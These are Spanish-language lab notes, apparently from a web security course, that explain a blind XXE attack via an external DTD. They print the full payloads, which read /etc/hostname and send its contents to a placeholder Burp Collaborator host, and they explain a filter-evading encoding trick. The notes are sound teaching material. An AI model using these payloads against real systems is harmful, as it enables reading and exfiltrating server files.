En esta clase continuamos con el mismo laboratorio anterior, centrado en la explotación de una vulnerabilidad XXE ciega mediante una DTD externa maliciosa. Ya tenemos definido y alojado el archivo DTD en nuestro exploit server, y ahora utilizamos este recurso para finalizar la exfiltración del contenido del archivo /etc/hostname.

Repasamos cómo se estructura correctamente la carga XML que referencia esa DTD, y analizamos los resultados obtenidos en Burp Collaborator para verificar que la petición externa con los datos del archivo fue realizada correctamente. Este enfoque consolida el uso de entidades parametrizadas en DTD externas como una técnica poderosa para filtrar información sensible en entornos sin salida directa.

Solucion
Explicacion de los payloads
(<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
%eval;
%exfil;)
## 🧩 Desglose paso a paso

### 1. `<!ENTITY % file SYSTEM "file:///etc/hostname">`

- Declara una **entidad de parámetro** llamada `%file`.
    
- Su contenido será el **contenido real del archivo `/etc/hostname`** (en sistemas Unix/Linux, este archivo contiene el nombre del host del sistema).
    

---

### 2. `<!ENTITY % eval "...">`

- Declara una **nueva entidad de parámetro** llamada `%eval`.
    
- Su contenido es **otra declaración de entidad DTD**, codificada como texto.
    

xml

CopiarEditar

`"<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>"`

- Aquí `&#x25;` es el **carácter `%` en hexadecimal**, usado para evadir filtros.
    
- Esto crea una entidad llamada `%exfil`, cuyo valor será el resultado de una petición a:
    
    ruby
    
    CopiarEditar
    
    `http://BURP-COLLABORATOR-SUBDOMAIN/?x=[contenido de /etc/hostname]`
    

---

### 3. `%eval;`

- Expande la entidad `%eval`, lo que **inyecta dinámicamente la declaración de `%exfil`** en el DTD.
    

---

### 4. `%exfil;`

- Finalmente se **invoca `%exfil`**, lo que hace que el servidor **haga una solicitud HTTP al dominio del atacante**, enviando como parámetro el contenido de `/etc/hostname`.

El otro payload (<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>)

## 🧩 ¿Qué hace este payload?

### 1. `<!ENTITY % xxe SYSTEM "YOUR-DTD-URL">`

- Declara una **entidad de parámetro** llamada `%xxe`.
    
- Su valor **no está definido localmente**, sino que se obtiene desde una **URL externa controlada por el atacante** (tu propia DTD personalizada).
    

### 2. `%xxe;`

- Expande esa entidad, lo que **inyecta el contenido del archivo DTD remoto** dentro del DTD local.
    
- Ese contenido puede incluir **nuevas entidades**, como:
    
    - Lectura de archivos locales.
        
    - Exfiltración de datos a través de HTTP.
        
    - Denegación de servicio, etc.

![[Pasted image 20250730200622.png]]
